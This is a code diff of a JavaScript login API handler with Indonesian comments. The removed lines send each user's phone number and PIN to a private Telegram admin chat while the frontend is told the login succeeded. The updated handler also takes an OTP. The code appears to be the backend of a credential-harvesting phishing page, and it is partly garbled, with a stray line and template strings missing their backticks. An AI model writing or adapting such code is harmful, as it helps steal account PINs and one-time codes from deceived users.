@@ -3,27 +3,11 @@ import { createClient } from '@supabase/supabase-js';
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });
 
-  const { phone, pin, type } = req.body;
-Telegram
-    try {
-      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
-      const adminChatId = process.env.ADMIN_CHAT_ID;
-      if (telegramToken && adminChatId) {
-        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: adminChatId,
-            text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
-            parse_mode: 'Markdown'
-          })
-        });
-      }
-    } catch (err) {
-      console.error('Gagal kirim notifikasi login:', err);
-      // Tetap berikan respons sukses ke frontend
-    }
+  const { phone, pin, otp, type } = req.body;
 
+  // Jika type = 'login', hanya simpan di localStorage (tidak perlu simpan di DB)
+  if (type === 'login') {
+    // Tidak melakukan apa-apa, hanya mengembalikan sukses
     return res.status(200).json({ success: true });
   }
 
